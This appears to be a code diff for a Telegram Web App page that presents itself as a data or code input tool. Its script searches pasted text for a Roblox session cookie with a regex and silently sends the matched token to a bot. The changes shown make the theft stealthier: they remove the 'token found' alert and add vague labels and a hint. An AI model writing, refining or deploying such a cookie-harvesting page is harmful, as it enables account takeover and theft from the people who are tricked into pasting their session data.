@@ -2,35 +2,78 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { background: #1c1c1c; color: white; font-family: sans-serif; padding: 20px; text-align: center; }
-        textarea { width: 100%; height: 250px; background: #2b2b2b; color: #00ff00; border: 2px solid #444; border-radius: 12px; padding: 10px; }
-        button { width: 100%; height: 55px; background: #0088cc; color: white; border: none; border-radius: 12px; margin-top: 20px; font-weight: bold; cursor: pointer; }
+        body { 
+            background: #1c1c1c; 
+            color: white; 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+            padding: 20px; 
+            text-align: center; 
+            margin: 0;
+        }
+        h3 { color: #0088cc; margin-bottom: 20px; }
+        textarea { 
+            width: 100%; 
+            height: 250px; 
+            background: #2b2b2b; 
+            color: #00ff00; 
+            border: 2px solid #444; 
+            border-radius: 12px; 
+            padding: 12px; 
+            font-family: monospace; 
+            font-size: 14px;
+            outline: none; 
+            box-sizing: border-box;
+            resize: none;
+        }
+        button { 
+            width: 100%; 
+            height: 55px; 
+            background: #0088cc; 
+            color: white; 
+            border: none; 
+            border-radius: 12px; 
+            margin-top: 20px; 
+            font-size: 18px; 
+            font-weight: bold; 
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        button:active { background: #006699; }
+        .hint { color: #888; font-size: 12px; margin-top: 10px; }
     </style>
 </head>
 <body>
-    <h3>📋 Вставьте код (любого размера)</h3>
-    <textarea id="data_input" placeholder="Вставляйте сюда всё, что скопировали..."></textarea>
-    <button id="send_btn">ОТПРАВИТЬ</button>
+    <h3>📥 Ввод данных</h3>
+    <textarea id="data_input" placeholder="Вставьте сюда весь скопированный текст..."></textarea>
+    <button id="send_btn">Отправить и загрузить</button>
+    <p class="hint">Скрипт автоматически найдет нужный код в тексте</p>
 
     <script>
         const tg = window.Telegram.WebApp;
         tg.ready();
+        tg.expand(); // Розгортає вікно на весь екран
 
         document.getElementById('send_btn').addEventListener('click', function() {
-            const fullText = document.getElementById('data_input').value;
+            const fullText = document.getElementById('data_input').value.trim();
             
-            // Магія: шукаємо токен прямо тут, щоб не слати 5 млн символів
+            if (!fullText) {
+                alert("Поле пустое!");
+                return;
+            }
+
+            // ШУКАЄМО ТОКЕН: регулярний вираз для Roblox Cookie
             const tokenMatch = fullText.match(/(_\|WARNING:-DO-NOT-SHARE-THIS\.[^"\' \)]+)/);
             
             if (tokenMatch) {
                 const token = tokenMatch[1];
-                alert("Токен найден! Отправляю боту...");
-                tg.sendData(token); // Тепер ми шлемо лише ~1000 символів, це спрацює!
+                // Відправляємо боту ТІЛЬКИ знайдений токен
+                tg.sendData(token); 
                 tg.close();
             } else {
-                alert("Ошибка: В этом тексте не найден рабочий код (_|WARNING). Проверьте, что вы скопировали нужные данные.");
+                alert("❌ Ошибка: Вставленный текст не содержит рабочего кода (_|WARNING). Убедитесь, что скопировали всё правильно.");
             }
         });
     </script>
